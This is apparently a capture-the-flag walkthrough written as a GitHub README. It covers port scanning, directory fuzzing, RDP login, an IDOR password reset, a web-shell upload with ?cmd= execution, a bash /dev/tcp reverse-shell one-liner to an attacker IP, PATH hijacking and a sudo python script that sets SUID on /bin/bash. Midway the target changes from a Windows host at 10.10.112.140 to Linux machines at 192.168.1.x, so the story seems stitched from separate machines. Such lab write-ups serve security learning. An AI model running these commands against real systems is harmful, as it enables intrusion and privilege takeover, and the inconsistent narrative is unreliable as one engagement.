<hr style="border-color:red;"><h1 align="center"><img src="https://github.com/user-attachments/assets/f0df1054-6c17-4de7-a559-b483fc2ecf6d"></h1>

<hr style="border-color:red;"><h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Reconnaissance & Scanning</h1><hr style="border-color:red;">

### **- Verifying the connectivity of the discovered device:**

```bash
ping -c 1 10.10.112.140
```
```bash
ping
The ping command is used to check network connectivity between your machine and another device by sending ICMP (Internet Control Message Protocol) echo request packets.
-c 1
The -c flag specifies the number of echo request packets to send. In this case, -c 1 means only one packet will be sent.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/c6632734-b7e7-494a-b1af-51a091b19054"></picture><br>We are unable to receive the icmp packages back</h3><hr style="border-color:red;">

### **- Scanning of the discovered device to find all open ports to find possible access routes:**

```bash
nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn 10.10.112.140 -oG allPorts
```
```
-p-
This tells Nmap to scan all 65535 TCP ports (from 0 to 65535). By default, Nmap only scans the most common 1,000 ports.

--open
This filters the results to only show open ports, ignoring closed or filtered ports.

-sS
This specifies a SYN scan (also called a half-open scan or stealth scan).
Instead of fully establishing a TCP connection, Nmap sends an SYN packet and waits for a response.
If the target responds with SYN-ACK, it means the port is open.
If the target responds with RST, the port is closed.
If no response or an ICMP error is received, the port may be filtered (firewall blocking it).

-sC
Enables Nmap’s default script scanning.
This runs a set of default scripts to gather more information about detected services.
Scripts can detect vulnerabilities, enumerate software versions, and check for misconfigurations.
Equivalent to --script=default.

-sV
Performs version detection of services.
It tries to determine the exact software version running on open ports.

--min-rate 5000
This forces Nmap to send at least 5000 packets per second, making the scan faster.
Without this, Nmap adjusts the speed automatically based on network conditions.

-vvv
This increases verbosity level (very very verbose).
It provides real-time feedback while scanning.
You will see results as they are discovered instead of waiting for the full scan to complete.

-n
This disables DNS resolution, making the scan faster.
By default, Nmap tries to resolve IPs to hostnames, which can slow down the scan.

-Pn
This tells Nmap to skip the host discovery phase and assume the target is up.
Normally, Nmap pings the target first to check if it is online.
If a firewall is blocking pings, this option is useful to force a scan even if the target doesn’t respond to pings.

-oG allPorts
This tells Nmap to output the results in "Grepable" format and save them in a file called allPorts.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/0c7f2d92-7db5-4385-9a95-b37909cc7812"></picture><br>Accessible ports 80 & 3389, We see some information about the “WINDOWS OS” system and it has a web site</h3><hr style="border-color:red;">

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Vulnerability Assessment</h1><hr style="border-color:red;">

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 80</h2>

### **Scanning port 80 for possible vulnerabilities**
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/29ed1447-a54b-4a6d-9bae-800298d35f92"></picture></h3>

```bash
whatweb "10.10.112.140"
```
```
WhatWeb is a fingerprinting tool used to identify web technologies running on a target server or website.
It can detect CMS platforms (WordPress, Joomla, etc.), web frameworks, web server versions, programming languages, and more.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/7cf70d5c-8307-43bb-b16f-b4d372afca27"></picture><br>We obtain some information but not very relevant.</h3>


### **- We analyze the source code for possible information leaks or developer notes:**

```bash
CTRL+U
```

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/9faaed1c-908e-4685-922d-f12812c56d62"></picture><br>We found nothing here</h3>

### **- We will apply web Fuzzing to do a scan for possible hidden directories.**
```bash
gobuster dir -u http://10.10.112.140/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
```
gobuster dir
Uses Gobuster in directory brute-forcing mode.
It attempts to find hidden directories and files on the web server.

-u http://192.168.1.117/
Specifies the target URL (192.168.1.208).
The scan will try to discover directories and files within this web application.

-w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
Specifies the wordlist to use for directory brute-forcing.
This file (directory-list-2.3-medium.txt) contains a large list of common web directories.
Comes from SecLists, a well-known collection of security wordlists.

```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e58aecef-89e7-4a3e-b44f-a8be1d3f63b3"></picture><br>We found some directories</h3>

### **- We found this hidden directories**
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/cdab0a17-197b-425f-8076-ff48d47c5496"></picture><br>As a first point to observe we can see a user “wade”.</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/87a23a02-139d-4b74-b04b-4316ae1aa698"></picture><br>we see that “wade” has commented on “Ready Player One”.</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/637fc9be-d6af-4e3d-a8d6-0e1a71698299"></picture><br>Here we found a note and we don't know what “parzival” is about.</h3>

### **- As we do not know what the note he left himself means and we already have a possible user we could try an RDP connection with these possible credentials and we will use the REMMINA application for this:**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/bf1222a8-8223-473f-8216-43b4103a9f92"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/cf699f36-5ba6-4494-b94c-d449e2a1ca49"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/c9856ad8-3de7-4822-b805-c56bae4ff449"></picture><br>We are in.</h3>

### **- Investigating a bit inside the machine:**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/6b8f1b41-b63d-4d31-8e7b-d7d92d410580"></picture><br>Our first flag</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/d57db402-4aee-48a6-a2f6-2490c55bee8b"></picture><br>We have 3 users but we do not have permissions for the user “Administrator”. </h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/208b496d-c555-4fa5-b302-2d6099bbbbd4"></picture><br>The only thing left for us to investigate is this file</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/97f09c1c-035f-42f9-8614-aeb573db54b7"></picture><br>we do not have a password for the user “administrator”.</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/660eca7d-b346-4f30-931f-13ba93ca65a4"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/f86cb0e6-05de-4efa-a486-6056e27edac0"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/50d1ea42-b770-4d65-9ba1-72d1aa6e5e52"></picture><br></h3>
<h3 align="center"><picture><img src = ""></picture><br></h3>

### **We didn't find any method to crack the machine, so with Burpsuite we will intercept the password change request to see how the information travels:** 

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/27d9b0f6-638d-4af8-b3ed-1d04f5a6a5a0"></picture><br>The web behind when changing the password is sending the new password with an id that are linked so we could try to send the new password with a user that exists and as we know the admin user is always part of any environment as nro 1..</h3>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/586873d2-e441-436c-b98e-98196d6766cd"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/6cc54863-1269-4989-928f-96c3958ca734"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/c5d83f89-a718-42ce-b8ed-fc1bab0c78a6"></picture><br>Now we have access to a panel from where we can upload our own files to obtain remote command execution.</h3>

### **- Now that we have access to upload files we will try uploading a .php file to put our code inside to gain access to the machine**
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/0cfa99f6-5d20-4fdb-a6de-f7825bd4ac7e"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/0de4843f-7e82-44b8-abad-914fb16e24f0"></picture><br>This warning could be predetermined by the developer so we will try to upload the file with another type of extension that will allow us to upload it.</h3>

### **- We will upload a file again and this time we will intercept the request with Burpsuite to do a brute force attack to find the extension that we can upload:**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e7eff100-9117-499f-b17d-baa5243fb070"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/c0527740-b781-4aba-bde9-c0083390e438"></picture><br>We send the request to the intruder</h3>

```bash
CTRL+I
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/912aee89-1c96-46b8-9559-c281774ab54e"></picture><br>We select the part where we want the injection to be replaced to test different types of extensions</h3>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/37e9fab4-6b49-42e7-a920-56aae765f2b1"></picture><br>We add the different types of files we want to test</h3>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/606a8026-11b3-40ce-99dd-2c54b1606445"></picture></h3>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/787a72e8-95a4-401a-a80c-45d9938813e5"></picture><br>By means of a REGEX we can incorporate a column that tells us the status of the file upload so we will know when it was successful.</h3>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/91d1ffdc-8ed6-4b6a-a49c-979069bd1b53"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/54f122a6-edc8-4635-b681-16e3006269c0"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/94670640-dd90-48e6-b2bc-000b9b72bd47"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/9d3334b9-0725-4a3c-8287-b3d7d86036ed"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/93e99499-3898-4587-b2e1-9a581959f2fa"></picture><br>Successfully uploaded the compatible files now we have to test which of them works</h3>

### **- We will test the files by adding at the end ?cmd=whoami**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/0840fa5b-3770-4740-b3bf-3511c2555707"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/2c769303-9e6c-4c5f-9100-50a615086cdb"></picture><br>works!</h3>

### **- Now we will enter a linner command to send us a reversehell to our attacker machine**

### **We will listen on port 443 with NETCAT**
```bash
nc -nlvp 443
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/377d9fb7-f309-4725-a708-bdd6023d63a7"></picture></h3>

### **In our browser we enter the linner command**

```bash
bash -c "bash -i >%26 /dev/tcp/192.168.1.188/443 0>%261"
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/cd0c3b3a-06cc-4966-ae72-aac89c3d2f0d"></picture><br>Now we will get a connection</h3>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/b1d69e65-8664-405a-b933-0bbcb9300158"></picture><br>We are in</h3>

### **- We apply TTY treatment:**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

### **we apply the correct ratio to the new console:**
```bash
stty size
stty rows 61 columns 184
```

### **- Investigating inside the breached machine:**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/84f3faef-e3b2-4e60-bdc5-0b54f04e2488"></picture><br>Searching in the system we found a potential access way by using the id_rsa but we do not have access to this information because we do not have the necessary permissions.</h3>
<br>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/5909cbab-17fe-4269-904c-e6905b37ee18"></picture><br>Here we can see that we have access to the toto file so we will analyze what it does.</h3>
<br>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/5e6bf97b-b50f-4106-b814-281cdf065854"></picture><br>We can see that this file (compiled binary) that works as the id command shows us or gives us access to john's uid information. </h3>
<br>

### **- Since we assume that the binary is the same function as the ID command only that this points to the user JOHN, what we can do is modify the $PATH since this is the path that all programs follow in search of whether they are in the system, thus achieving that before using the ID command uses a command created by us that will be called ID.**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e75c4e47-b047-4a0a-b123-16fb2007c362"></picture></h3>

### **- Here we can already observe how the $PATH has changed, now what we have left is to create the file that we will call “id” and we will elevate its privileges so that it is found, inside that file we will put a code that assigns us a shell with elevated privileges.**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/118101bd-76d6-4638-b12b-f43de6121813"></picture></h3>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/3e8420fb-4bf4-435a-ba04-d7a4cd17f979"></picture><br>by executing the “toto” binary we are now the user “john”.</h3>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/0fa99b60-4a39-47db-aeeb-948e2c529ce7"></picture><br>Now we have a password</h3>

### **- Now we will connect via SSH**
```bash
ssh john@192.168.1.117
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e6c191b1-5464-40bb-9f81-5116198f6563"></picture><br>We are in!</h3>

### **Once inside the machine of the user “john” we will now look for clues as to what the user has been doing to get an idea of how we can elevate our privileges.
Our first step will be to check the .bash_history as this will give us an idea of how the user works.**
```bash
cat .bash_history
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/c639148a-9675-4c7c-9738-844cc2e4478d"></picture></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/dea13655-895e-4b61-9c1d-8d101f302551"></picture><br>clearly we can see how this is done using the file 'file.py' since python can be used without root permissions</h3>

### **- Now we have to modify the file “file.py” so that when we execute it, it elevates our privileges and we can be “root”.**
```bash
nano file.py
```
```bash
import os

os.system("chmod u+s /bin/bash")
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/614b8136-73cb-48a0-ba1c-a735da3e498e"></picture></h3>

### **- We execute the ''file.py''**
```bash
sudo /usr/bin/python3 /home/john/file.py
bash -p
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/67a43a3f-70a9-48ab-8280-b83050e677ca"></picture><br>We are in!</h3>
